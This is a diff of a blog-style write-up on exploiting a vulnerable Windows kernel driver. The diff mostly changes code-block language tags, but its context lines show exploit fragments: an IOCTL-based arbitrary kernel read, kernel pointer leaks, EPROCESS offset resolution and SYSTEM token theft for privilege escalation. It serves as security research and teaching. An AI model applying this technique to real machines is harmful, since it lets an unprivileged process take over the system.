@@ -43,7 +43,7 @@ Excellent, this could act as a read/write primitive. To test this, I started con
 
 I started by creating some essentials, creating the necessary imports and driver device string.
 
-```c
+```cpp
 #include <iostream>
 #include <Windows.h>
 
@@ -56,7 +56,7 @@ The driver checked the user supplied struct was `0x38` bytes in size. As such I 
 
 Checking the Ghidra code again this indicates that the destination will be `address4`, the source `address5`, and the size `address5`.
 
-```c
+```cpp
 typedef struct {
     ULONGLONG address0;
     ULONGLONG address1;
@@ -72,7 +72,7 @@ Next up was actually issuing the request to the driver and to handle any resulti
 
 To do so I created a method to dynamically allocate memory corresponding to a user supplied `amount` of QWORDS. Then issue the target request, to copy from the `target_address` to the allocated `output_buff`. 
 
-```c
+```cpp
 ULONGLONG* arbitrary_read(HANDLE device_handle, ULONGLONG target_address, int amount) {
     // Allocate memory and address to read to
     LPVOID output_buff = VirtualAlloc(
@@ -114,7 +114,7 @@ Lastly to build out the `main` method to handle creating the driver handle and p
 
 To start out I indicated that I wanted to read out 8 QWORDS of data from the `KUSER_SHARED_DATA` structure, indicated by `amount`.
 
-```c
+```cpp
 int main()
 {
     printf_s("\t[**] Opening handle to driver!\n");
@@ -218,9 +218,11 @@ After reading through numerous articles ranging in topic from: incorporating mor
 After far too many BSODs I finally found something of interest, IOCTL code `0x80002010` would invoke the method, verbosely named, `MmAllocateContiguousMemorySpecifyCache()` which according to Microsoft:
 
 ```
-Allocates a range of contiguous, nonpaged physical memory and maps it to the system address space. 
-
-The routine maps this block to a contiguous block of virtual memory in the system address space and returns the virtual address of the base of this block.
+Allocates a range of contiguous, nonpaged physical
+memory and maps it to the system address space.
+The routine maps this block to a contiguous block 
+of virtual memory in the system address space and 
+returns the virtual address of the base of this block.
 ```
 
 This seems consistent with the method that follows which verifies that the returned value corresponds to a physical address with `MmGetPhysicalAddress`.
@@ -231,7 +233,7 @@ After which the Physical address is returned in the input buffer as the first va
 
 Time to construct some code to try and accomplish just that. I started by modifying the arbitrary read function to read one QWORD at a time as this was more stable than more nested loops to parse the returned data.
 
-```c
+```cpp
 // Dropped amount argument, set to always 1 - return type now ULONGLONG
 ULONGLONG arbitrary_read(HANDLE device_handle, ULONGLONG address) {
     int amount = 1;
@@ -244,7 +246,7 @@ ULONGLONG arbitrary_read(HANDLE device_handle, ULONGLONG address) {
 
 I then started working on the code to try and leak pointers, knowing that the `MmSystemRangeStart` for `ntoskrnl` is `0xffff8000'00000000` I decided I would iterate over the returned address block and look for values pointing to any usable structures or addresses inside ntoskrnl.
 
-```c
+```cpp
 typedef struct {
     ULONGLONG address0;
     ULONGLONG address1;
@@ -321,7 +323,7 @@ Based on some checks across multiple Windows 10 versions and an up-to-date Windo
 
 For starters I needed to check the offsets for the `PsInitialSystemProcess` and `HviGetHardwareFeatures`. To do so I added the needed `LoadLibraryA` and `GetProcAddress` calls in a method that supported passing an ASCII string.
 
-```c
+```cpp
 DWORD GetOffset(LPSTR method) {
     HMODULE ntoskrnl = NULL;
     DWORD methodAddrOffset = 0;
@@ -355,7 +357,7 @@ int main() {
 
 Now, to move onto the code to parse out the `PspSystemQuotaBlock`. Rechecking the allocation and adding a print out for the offsets, I noticed it is 'almost' always located at offsets `0x20` and `0x50`.
 
-```c
+```d
 C:\Users\n00b\Desktop>.\demo.exe
         [**] Opening handle to driver!
 [20]> fffff8062da53880
@@ -368,7 +370,7 @@ C:\Users\n00b\Desktop>.\demo.exe
 
 I updated my code with this in mind. To avoid leaking the wrong value I decided to loop the leak and validate that both these offsets had the same value on separate attempts, which was enough to avoid BSOD in 99% of cases. 
 
-```c
+```cpp
 int main() {
     ...
     ULONGLONG psystemquotablock_one;
@@ -398,7 +400,7 @@ Much of the above code assumes that the `walk_nt` function can resolve for the `
 
 The function starts with the `PsSystemQuotaBlock` address and in a loop reads at an offset of `-0x10` to try and find the header for the function signature. If not, it will then increment the offset decrement by `0x10`. Both signature block cases are checked for when a matching QWORD header is found.
 
-```c
+```cpp
 ULONGLONG walk_nt(HANDLE device_handle, ULONGLONG psysquota)
 {
     // To Find nt!HviGetHardwareFeatures
@@ -437,7 +439,7 @@ There are of course many limitations and caveats that come with this approach; r
 
 Speaking of version independency, may as well commit to the intent. I created the below functions to be run at the start of main method execution to correct for the `EPROCESS` offsets differing between Windows versions.
 
-```c
+```cpp
 DWORD TOKEN_OFFSET;
 DWORD PID_OFFSET;
 DWORD APL_OFFSET;
@@ -589,7 +591,7 @@ This string is then used to map to a corresponding offset value. Please note the
 
 Now finally with all the pieces in place I could attempt to read the SYSTEM `EPROCESS` structure and perform the token theft. I quickly put together a small piece of code to walk the `ActiveProcessLinks` until my current process id was found, after which the `EPROCESS` pointer would be returned.
 
-```c
+```cpp
 ULONGLONG GetCurrentEproc(HANDLE DriverHandle, ULONGLONG sys_eproc) {
     DWORD target = GetCurrentProcessId();
     ULONGLONG CurrentEprocess = sys_eproc;
@@ -608,7 +610,7 @@ ULONGLONG GetCurrentEproc(HANDLE DriverHandle, ULONGLONG sys_eproc) {
 
 Finally, having finished out the last of my `main` method's functionality we can now actually perform the SYSTEM token theft and elevate our privileges from that of a `low integrity` process. The below code does the typical calculations and invokes the above code to find our current process' `EPROCESS` and swaps the token values, preserving the token's last nibble; the Reference Counter / `RefCnt`.
 
-```c
+```cpp
             ULONGLONG sys_eproc = arbitrary_read(DriverHandle, nt_base + PSISP_offset);
             printf_s("\t[++] SYSTEM _EPROC: %llx\n", sys_eproc);
 
